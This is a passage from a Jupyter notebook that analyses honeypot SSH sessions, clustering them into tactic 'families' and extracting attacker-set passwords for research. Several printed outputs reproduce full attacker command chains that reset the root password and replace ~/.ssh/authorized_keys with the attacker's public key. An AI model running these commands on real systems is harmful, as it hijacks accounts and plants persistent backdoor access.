      "cat /proc/cpuinfo | grep name | wc -l ; echo -e \"xxxxxxxx\\nPYfAH5MyiOyT\\nPYfAH5MyiOyT\" | passwd | bash ; Enter new UNIX password: ; echo \"xxxxxxxx\\nPYfAH5MyiOyT\\nPYfAH5MyiOyT\\n\" | passwd ; cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9 ; }' ; free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' ; ls -lh $(which ls) ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ;\n",
      "\n"
     ]
    }
   ],
   "source": [
    "plotted_family = df_prototypes.Models_predictions.iloc[1]\n",
    "print(f\"For family: \\n{plotted_family}\\n\\n\")\n",
    "for it in range(3):\n",
    "    print(predicted_corpus[predicted_corpus.Models_predictions == plotted_family].full_session.iloc[it])\n",
    "    print()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "df75faf9-d1c4-46a5-afe3-caa20be62ce9",
   "metadata": {
    "jp-MarkdownHeadingCollapsed": true,
    "tags": []
   },
   "source": [
    "#### Something interesting here: family is always changing the password prompting:\n",
    "- user\n",
    "- new password"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5caa105b-c996-474a-a833-16a262542d9e",
   "metadata": {},
   "source": [
    "#### Let's investigate which are the options here"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "c87c9056-44ac-4ca1-b67a-b16ca1aabf55",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>full_session</th>\n",
       "      <th>random_word</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>5842</th>\n",
       "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo -...</td>\n",
       "      <td>\"123456\\nSa2puN1djQSJ\\nSa2puN1djQSJ\"</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5848</th>\n",
       "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo -...</td>\n",
       "      <td>\"marilia\\noVIJt7nM5lyv\\noVIJt7nM5lyv\"</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                           full_session  \\\n",
       "5842  cat /proc/cpuinfo | grep name | wc -l ; echo -...   \n",
       "5848  cat /proc/cpuinfo | grep name | wc -l ; echo -...   \n",
       "\n",
       "                                random_word  \n",
       "5842   \"123456\\nSa2puN1djQSJ\\nSa2puN1djQSJ\"  \n",
       "5848  \"marilia\\noVIJt7nM5lyv\\noVIJt7nM5lyv\"  "
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "index_random_word = [it for it, el in enumerate(to_plot) if el==100][0]\n",
    "df_sessions_of_interest = predicted_corpus[predicted_corpus.Models_predictions == plotted_family][[\"full_session\"]]\n",
    "df_sessions_of_interest[\"random_word\"] = df_sessions_of_interest[\"full_session\"].apply(lambda session: session.split(\" \")[index_random_word])\n",
    "df_sessions_of_interest.head(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "a3f2bb66-6f92-4715-b64a-e27b39785d3c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attacker is following the 'passwd' pattern 26527 times out of 26527 (100.00 %)\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>full_session</th>\n",
       "      <th>random_word</th>\n",
       "      <th>is_password</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>5842</th>\n",
       "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo -...</td>\n",
       "      <td>\"123456\\nSa2puN1djQSJ\\nSa2puN1djQSJ\"</td>\n",
       "      <td>True</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5848</th>\n",
       "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo -...</td>\n",
       "      <td>\"marilia\\noVIJt7nM5lyv\\noVIJt7nM5lyv\"</td>\n",
       "      <td>True</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                           full_session  \\\n",
       "5842  cat /proc/cpuinfo | grep name | wc -l ; echo -...   \n",
       "5848  cat /proc/cpuinfo | grep name | wc -l ; echo -...   \n",
       "\n",
       "                                random_word  is_password  \n",
       "5842   \"123456\\nSa2puN1djQSJ\\nSa2puN1djQSJ\"         True  \n",
       "5848  \"marilia\\noVIJt7nM5lyv\\noVIJt7nM5lyv\"         True  "
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_sessions_of_interest[\"is_password\"] = df_sessions_of_interest[\"random_word\"].apply(lambda word: True if len(word.split(\"\\\\n\")) != 1 else False)\n",
    "counter_pattern = df_sessions_of_interest[df_sessions_of_interest[\"is_password\"] == True].shape[0]\n",
    "print(f\"Attacker is following the 'passwd' pattern {counter_pattern} times out of {df_sessions_of_interest.shape[0]} ({counter_pattern / df_sessions_of_interest.shape[0] * 100:3.2f} %)\")\n",
    "df_sessions_of_interest.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fdbcd732-e677-418e-b704-9e3815b3f51e",
   "metadata": {},
   "source": [
    "### For each session, identify:\n",
    "- username \n",
    "- password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "c103edae-3b4a-4b17-a24f-986ef3969971",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Number of unique users: 12741\n",
      "Number of new passwords: 26442\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>full_session</th>\n",
       "      <th>random_word</th>\n",
       "      <th>is_password</th>\n",
       "      <th>user</th>\n",
       "      <th>password</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>5842</th>\n",
       "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo -...</td>\n",
       "      <td>\"123456\\nSa2puN1djQSJ\\nSa2puN1djQSJ\"</td>\n",
       "      <td>True</td>\n",
       "      <td>123456</td>\n",
       "      <td>Sa2puN1djQSJ</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5848</th>\n",
       "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo -...</td>\n",
       "      <td>\"marilia\\noVIJt7nM5lyv\\noVIJt7nM5lyv\"</td>\n",
       "      <td>True</td>\n",
       "      <td>marilia</td>\n",
       "      <td>oVIJt7nM5lyv</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                           full_session  \\\n",
       "5842  cat /proc/cpuinfo | grep name | wc -l ; echo -...   \n",
       "5848  cat /proc/cpuinfo | grep name | wc -l ; echo -...   \n",
       "\n",
       "                                random_word  is_password     user  \\\n",
       "5842   \"123456\\nSa2puN1djQSJ\\nSa2puN1djQSJ\"         True   123456   \n",
       "5848  \"marilia\\noVIJt7nM5lyv\\noVIJt7nM5lyv\"         True  marilia   \n",
       "\n",
       "          password  \n",
       "5842  Sa2puN1djQSJ  \n",
       "5848  oVIJt7nM5lyv  "
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_sessions_of_interest[\"user\"] = df_sessions_of_interest[\"random_word\"].apply(lambda word: word.split(\"\\\\n\")[0].replace('\"', \"\"))\n",
    "df_sessions_of_interest[\"password\"] = df_sessions_of_interest[\"random_word\"].apply(lambda word: word.split(\"\\\\n\")[1].replace('\"', \"\"))\n",
    "print(f\"Number of unique users: {df_sessions_of_interest['user'].nunique()}\\nNumber of new passwords: {df_sessions_of_interest['password'].nunique()}\")\n",
    "df_sessions_of_interest.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "57e9adf3-7baf-435d-834d-38dc86879363",
   "metadata": {},
   "source": [
    "## Now, let's do the same with another family \n",
    "### Let's pick second example"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "84218d6b-42c5-431c-9e32-73e2fa9a3797",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 500x400 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "to_plot = df_prototypes.iloc[0].prototype[0]\n",
    "\n",
    "fig, axs = plt.subplots(1, figsize=(5,4))\n",
    "fontsize = 20\n",
    "axs.bar(np.arange(to_plot.shape[0]), to_plot)\n",
    "#axs.scatter(cdf_full_predictions.reset_index()[\"Counter\"], cdf_full_predictions.reset_index()[0], c = \"k\", s = 20)\n",
    "#axs.scatter(cdf_no_rep_predictions.reset_index()[\"Counter\"], cdf_no_rep_predictions.reset_index()[0], c = \"k\", s = 20)\n",
    "\n",
    "axs.set_xlabel(\"Words' positions\", fontsize = fontsize - 5)\n",
    "axs.set_ylabel('Unique elements per position', fontsize = fontsize - 5)\n",
    "axs.set_title(f'Unique elements per posision\\nwrt selected family', fontsize = fontsize)\n",
    "axs.yaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.xaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.grid()\n",
    "#axs.set_ylim(0,1.05)\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "39c88d24-27f3-44b3-bc21-69c4640937c7",
   "metadata": {},
   "source": [
    "#### Examples belonging to that family: "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "2684222c-884a-4452-a1d0-abf13f0605e8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "For family: \n",
      "Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence -- Persistence\n",
      "\n",
      "\n",
      "cat /proc/cpuinfo | grep name | wc -l ; echo \"root:VZjgynJqIkcc\" | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9 ; }' ; free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' ; ls -lh $(which ls) ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ;\n",
      "\n",
      "cat /proc/cpuinfo | grep name | wc -l ; echo \"root:GT2YYX9r7nzb\" | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9 ; }' ; free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' ; ls -lh $(which ls) ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ;\n",
      "\n",
      "cat /proc/cpuinfo | grep name | wc -l ; echo \"root:K335nMx8FCAO\" | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9 ; }' ; free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' ; ls -lh $(which ls) ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ;\n",
      "\n"
     ]
    }
   ],
   "source": [
    "plotted_family = df_prototypes.Models_predictions.iloc[0]\n",
    "print(f\"For family: \\n{plotted_family}\\n\\n\")\n",
    "for it in range(3):\n",
    "    print(predicted_corpus[predicted_corpus.Models_predictions == plotted_family].full_session.iloc[it])\n",
    "    print()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ab25eb1d-159f-4d08-9630-7bd5ff104da5",
   "metadata": {},
   "source": [
    "#### Something interesting here: family is always changing the password prompting:\n",
    "- Original password\n",
    "- New passowrd\n",
    "- Confirmation for new password"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e3b87d66-f4a8-411b-94f3-32217495fde2",
   "metadata": {},
   "source": [
    "#### Let's investigate which are the options here"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "d976412b-3155-4e55-8aef-886343ef64a5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>full_session</th>\n",
       "      <th>random_word</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>5857</th>\n",
       "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo \"...</td>\n",
       "      <td>\"root:VZjgynJqIkcc\"</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5858</th>\n",
       "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo \"...</td>\n",
       "      <td>\"root:GT2YYX9r7nzb\"</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                           full_session          random_word\n",
       "5857  cat /proc/cpuinfo | grep name | wc -l ; echo \"...  \"root:VZjgynJqIkcc\"\n",
       "5858  cat /proc/cpuinfo | grep name | wc -l ; echo \"...  \"root:GT2YYX9r7nzb\""
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "index_random_word = [it for it, el in enumerate(to_plot) if el==100][0] # Pick second item, since first might be buggy\n",
    "df_sessions_of_interest = predicted_corpus[predicted_corpus.Models_predictions == plotted_family][[\"full_session\"]]\n",
    "df_sessions_of_interest[\"random_word\"] = df_sessions_of_interest[\"full_session\"].apply(lambda session: session.split(\" \")[index_random_word])\n",
    "df_sessions_of_interest.head(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "8079b8a9-6d87-4957-b94e-b25a57d044af",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attacker is following the 'chpasswd' pattern 50705 times out of 50705 (100.00 %)\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>full_session</th>\n",
       "      <th>random_word</th>\n",
       "      <th>is_password</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>5857</th>\n",
       "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo \"...</td>\n",
       "      <td>\"root:VZjgynJqIkcc\"</td>\n",
       "      <td>True</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5858</th>\n",
       "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo \"...</td>\n",
       "      <td>\"root:GT2YYX9r7nzb\"</td>\n",
       "      <td>True</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                           full_session          random_word  \\\n",
       "5857  cat /proc/cpuinfo | grep name | wc -l ; echo \"...  \"root:VZjgynJqIkcc\"   \n",
       "5858  cat /proc/cpuinfo | grep name | wc -l ; echo \"...  \"root:GT2YYX9r7nzb\"   \n",
       "\n",
       "      is_password  \n",
       "5857         True  \n",
       "5858         True  "
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_sessions_of_interest[\"is_password\"] = df_sessions_of_interest[\"random_word\"].apply(lambda word: True if len(word.split(\":\")) != 1 else False)\n",
    "counter_pattern = df_sessions_of_interest[df_sessions_of_interest[\"is_password\"] == True].shape[0]\n",
    "print(f\"Attacker is following the 'chpasswd' pattern {counter_pattern} times out of {df_sessions_of_interest.shape[0]} ({counter_pattern / df_sessions_of_interest.shape[0] * 100:3.2f} %)\")\n",
    "df_sessions_of_interest.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9eb44952-3418-4a8c-8dae-ee4426eaa867",
   "metadata": {},
   "source": [
    "### For each session, identify:\n",
    "- user\n",
    "- new password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "cd3779d6-088b-4666-ab63-d9b2d6129b3c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Number of unique users: 1\n",
      "Number of new passwords: 50705\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>full_session</th>\n",
       "      <th>random_word</th>\n",
       "      <th>is_password</th>\n",
       "      <th>user</th>\n",
       "      <th>new_password</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>5857</th>\n",
       "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo \"...</td>\n",
       "      <td>\"root:VZjgynJqIkcc\"</td>\n",
       "      <td>True</td>\n",
       "      <td>root</td>\n",
       "      <td>VZjgynJqIkcc</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5858</th>\n",
       "      <td>cat /proc/cpuinfo | grep name | wc -l ; echo \"...</td>\n",
       "      <td>\"root:GT2YYX9r7nzb\"</td>\n",
       "      <td>True</td>\n",
       "      <td>root</td>\n",
       "      <td>GT2YYX9r7nzb</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                           full_session          random_word  \\\n",
       "5857  cat /proc/cpuinfo | grep name | wc -l ; echo \"...  \"root:VZjgynJqIkcc\"   \n",
       "5858  cat /proc/cpuinfo | grep name | wc -l ; echo \"...  \"root:GT2YYX9r7nzb\"   \n",
       "\n",
       "      is_password  user  new_password  \n",
       "5857         True  root  VZjgynJqIkcc  \n",
       "5858         True  root  GT2YYX9r7nzb  "
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_sessions_of_interest[\"user\"] = df_sessions_of_interest[\"random_word\"].apply(lambda word: word.split(\":\")[0].replace('\"', \"\"))\n",
    "df_sessions_of_interest[\"new_password\"] = df_sessions_of_interest[\"random_word\"].apply(lambda word: word.split(\":\")[1].replace('\"', \"\"))\n",
    "print(f\"Number of unique users: {df_sessions_of_interest['user'].nunique()}\\nNumber of new passwords: {df_sessions_of_interest['new_password'].nunique()}\")\n",
    "df_sessions_of_interest.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8b9bb52f-8862-4687-a846-1195b9f4c0ca",
   "metadata": {},
   "source": [
    "## Now, another example\n",
    "### Let's choose a family in which \"Execution\" is part of the prediction and the number of associated sessions is big enough"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "90380f06-154a-43f8-87c7-3eba2af66e8d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Models_predictions</th>\n",
       "      <th>associated_sessions</th>\n",
       "      <th>percentage_varying_elements</th>\n",
       "      <th>prototype</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Execution -- Execution -- Execution -- Executi...</td>\n",
       "      <td>1085</td>\n",
       "      <td>100.0</td>\n",
       "      <td>[[0.3686635944700461, 0.4608294930875576, 0.27...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>33</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>334</td>\n",
       "      <td>100.0</td>\n",
       "      <td>[[0.29940119760479045, 0.29940119760479045, 0....</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                   Models_predictions  associated_sessions  \\\n",
       "3   Execution -- Execution -- Execution -- Executi...                 1085   \n",
       "33  Discovery -- Discovery -- Discovery -- Discove...                  334   \n",
       "\n",
       "    percentage_varying_elements  \\\n",
       "3                         100.0   \n",
       "33                        100.0   \n",
       "\n",
       "                                            prototype  \n",
       "3   [[0.3686635944700461, 0.4608294930875576, 0.27...  \n",
       "33  [[0.29940119760479045, 0.29940119760479045, 0....  "
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "filtered_prototypes = df_prototypes[df_prototypes.Models_predictions.str.contains(\"Execution\")].sort_values(by = \"associated_sessions\", ascending = False)\n",
    "filtered_prototypes.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "296de1a6-eaf2-40f0-b056-2dafb9520af8",
   "metadata": {},
   "source": [
    "#### Let's pick first example"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "d46931ad-bd72-44fd-8520-a2a333183b9c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 400x300 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "to_plot = filtered_prototypes.iloc[0].prototype[0]\n",
    "\n",
    "fig, axs = plt.subplots(1, figsize=(4,3))\n",
    "fontsize = 15\n",
    "axs.bar(np.arange(to_plot.shape[0]), to_plot, color = '#481d6f')\n",
    "axs.set_xlabel(\"Tactic position\", fontsize = fontsize )\n",
    "axs.set_ylabel('% varying words', fontsize = fontsize)\n",
    "axs.set_xticks(np.arange(0, to_plot.shape[0] + 1, 2))\n",
    "axs.set_yticks(np.arange(0, 100 + 1, 25))\n",
    "\n",
    "axs.yaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.xaxis.set_tick_params(labelsize=fontsize, rotation = 30)\n",
    "axs.grid()\n",
    "plt.tight_layout()\n",
    "plt.savefig(\"./Inference_results/4_Forensic/prototype_execution.pdf\",dpi=300, bbox_inches = \"tight\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b127833b-411a-4ccd-8fe2-e2a3fe23615a",
